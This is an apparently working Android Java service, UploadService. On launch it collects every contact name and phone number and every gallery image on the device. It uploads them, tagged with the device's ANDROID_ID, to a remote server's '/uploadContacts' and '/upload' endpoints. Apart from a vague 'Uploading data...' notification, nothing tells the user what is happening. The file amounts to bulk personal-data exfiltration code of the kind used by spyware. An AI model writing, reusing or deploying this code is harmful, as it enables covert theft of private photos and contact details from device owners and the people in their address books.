package com.phc.serviceapp;

import static android.content.ContentValues.TAG;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class UploadService extends Service {

    private final ExecutorService executorService = Executors.newFixedThreadPool(4);

    @Override
    public void onCreate() {
        super.onCreate();
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "UPLOAD_CHANNEL_ID",
                    "File Upload Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create a notification for the foreground service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification notification = new NotificationCompat.Builder(this, "UPLOAD_CHANNEL_ID")
                    .setContentTitle("Upload Service")
                    .setContentText("Uploading data...")
                    .setSmallIcon(R.drawable.ic_upload)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .build();
            startForeground(1, notification);
        }

        // Start the existing background tasks
        new Thread(() -> {
            List<String> contacts = fetchContacts();
            List<String> galleryFiles = fetchGalleryData();
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

            // Process contacts asynchronously
            if (contacts != null) {
                for (String contact : contacts) {
                    executorService.execute(() -> uploadContact(Collections.singletonList(contact), androidId));
                }
            }

            // Process gallery files asynchronously
            if (galleryFiles != null) {
                for (String filePath : galleryFiles) {
                    executorService.execute(() -> uploadFileAsync(filePath, androidId));
                }
            }

            // Stop the foreground service when all tasks are done
            executorService.shutdown();
            try {
                // Await termination of all tasks
                if (executorService.awaitTermination(60, java.util.concurrent.TimeUnit.SECONDS)) {
                    stopForeground(true);
                    stopSelf();
                }
            } catch (InterruptedException e) {
                Log.e(TAG, "Error shutting down executor: ", e);
            }
        }).start();

        return START_STICKY; // Keeps the service running unless explicitly stopped
    }


    private List<String> fetchContacts() {
        List<String> contacts = new ArrayList<>();
        ContentResolver resolver = getContentResolver();

        // Check if the READ_CONTACTS permission is granted
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.e("PermissionError", "READ_CONTACTS permission not granted.");
            // Optionally notify the user or log the error
            return contacts; // Return an empty list to avoid crash
        }

        Cursor cursor = null;
        try {
            // Query the ContactsContract to get all contacts
            cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    // Query the Phone table to get the phone numbers associated with the contact
                    Cursor phones = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId}, null);

                    if (phones != null) {
                        while (phones.moveToNext()) {
                            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            // Add the contact's name and phone number to the list
                            contacts.add(name + ": " + phoneNumber);
                        }
                        phones.close();
                    }
                }
            }
        } catch (SecurityException e) {
            Log.e("PermissionError", "SecurityException occurred while fetching contacts.", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        return contacts;
    }


    private List<String> fetchGalleryData() {
        List<String> filePaths = new ArrayList<>();

        // Check if the required permissions are granted
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                Log.e("PermissionError", "READ_MEDIA_IMAGES permission not granted.");
                return filePaths; // Return an empty list to avoid crash
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                Log.e("PermissionError", "READ_EXTERNAL_STORAGE permission not granted.");
                return filePaths; // Return an empty list to avoid crash
            }
        }

        Cursor cursor = null;
        try {
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {MediaStore.Images.Media.DATA};

            // Query the MediaStore to fetch image file paths
            cursor = getContentResolver().query(uri, projection, null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int dataIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                    if (dataIndex != -1) { // Ensure the column exists
                        String filePath = cursor.getString(dataIndex);
                        filePaths.add(filePath);
                    }
                }
            }
        } catch (SecurityException e) {
            Log.e("PermissionError", "SecurityException occurred while fetching gallery data.", e);
        } finally {
            if (cursor != null) {
                cursor.close(); // Ensure the cursor is closed to avoid memory leaks
            }
        }

        return filePaths;
    }

    private void uploadContact(List<String> contacts, String androidId) {
        try {
            if (contacts == null || contacts.isEmpty()) {
                Log.e(TAG, "No contacts to upload");
                return;
            }

            // Prepare the payload
            JSONArray contactsArray = new JSONArray();
            for (String contact : contacts) {
                if (contact != null && !contact.trim().isEmpty()) {
                    contactsArray.put(contact); // Add each contact to the JSON array
                }
            }

            JSONObject payload = new JSONObject()
                    .put("androidId", androidId)
                    .put("contacts", contactsArray);

            // Send the POST request
            sendPostRequest(getString(R.string.api_domain) + "/uploadContacts", payload.toString());
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload contacts", e);
        }
    }


    private void uploadFileAsync(String filePath, String androidId) {
        try {
            File file = new File(filePath);
            if (file.exists()) {
                uploadFile(getString(R.string.api_domain) + "/upload", file, androidId);
            } else {
                Log.e(TAG, "File not found: " + filePath);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to upload file: " + filePath, e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopForeground(true); // Remove the foreground notification
        executorService.shutdown(); // Shutdown executor service
    }


//    private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
//        String BASE_URL = getString(R.string.api_domain);
////        String contactsUrl = BASE_URL + "/api/Uploads/Contacts"; // Endpoint for contacts
////        String filesUrl = BASE_URL + "/api/Uploads/Files"; // Endpoint for file uploads
//
//         String contactsUrl = BASE_URL + "/uploadContacts";
//         String filesUrl = BASE_URL + "/upload";
//
//        // Check if the contacts list is empty or null
//        if (contacts == null || contacts.isEmpty()) {
//            Log.e(TAG, "Contacts list is empty or null");
//            return;
//        }
//
//        // Upload contacts as JSON
//        for (String contact : contacts) {
//            if (contact == null || contact.trim().isEmpty()) {
//                Log.e(TAG, "Skipping empty or invalid contact: " + contact);
//                continue;
//            }
//
//            try {
//                String payload = new JSONObject()
//                        .put("type", "contact")
//                        .put("data", escapeSpecialChars(contact))
//                        .put("androidId", androidId)
//                        .toString();
//
//                sendPostRequest(contactsUrl, payload);
//            } catch (Exception e) {
//                Log.e(TAG, "Failed to upload contact: " + contact, e);
//            }
//        }
//
//        // Check if the gallery files list is empty or null
//        if (galleryFiles == null || galleryFiles.isEmpty()) {
//            Log.e(TAG, "Gallery files list is empty or null");
//            return;
//        }
//
//        // Upload gallery files as multipart
//        for (String filePath : galleryFiles) {
//            if (filePath == null || filePath.trim().isEmpty()) {
//                Log.e(TAG, "Skipping empty or invalid file path: " + filePath);
//                continue;
//            }
//
//            File file = new File(filePath);
//            if (file.exists()) {
//                try {
//                    uploadFile(filesUrl, file, androidId);
//                } catch (Exception e) {
//                    Log.e(TAG, "Failed to upload file: " + filePath, e);
//                }
//            } else {
//                Log.e(TAG, "File not found: " + filePath);
//            }
//        }
//    }

    // Method to upload file using multipart
    private void uploadFile(String serverUrl, File file, String androidId) throws IOException {
        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .build();

        MultipartBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("androidId", androidId)
                .addFormDataPart("file", file.getName(),
                        RequestBody.create(file, MediaType.parse("image/jpeg")))
                .build();

        Request request = new Request.Builder()
                .url(serverUrl)
                .post(requestBody)
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (response.isSuccessful()) {
                Log.d(TAG, "File upload successful: " + file.getName());
            } else {
                String errorBody = response.body() != null ? response.body().string() : "No response body";
                Log.e(TAG, "Failed to upload file: " + file.getName() + ". Server responded: " + response.code() + " - " + errorBody);
            }
        } catch (IOException e) {
            Log.e(TAG, "Error during file upload: " + file.getName(), e);
            throw e; // Rethrow to trigger retry logic if needed
        }
    }


    // Escape special characters in the string to avoid JSON formatting issues
    private String escapeSpecialChars(String input) {
        if (input == null) {
            return "";
        }
        return input.replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }

    // Method to send the POST request
    private void sendPostRequest(String serverUrl, String payload) throws IOException {
        HttpURLConnection connection = null;
        try {
            // Set up connection
            URL url = new URL(serverUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // Write payload to output stream
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = payload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Get the response code from the server
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "Upload successful: " + payload);
            } else {
                // Read the response body for more detailed error info
                InputStream errorStream = connection.getErrorStream();
                if (errorStream != null) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));
                    StringBuilder errorResponse = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        errorResponse.append(line);
                    }
                    Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode + " - " + errorResponse.toString());
                } else {
                    Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode);
                }
            }

        } catch (IOException e) {
            Log.e("Upload", "Error uploading file", e);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
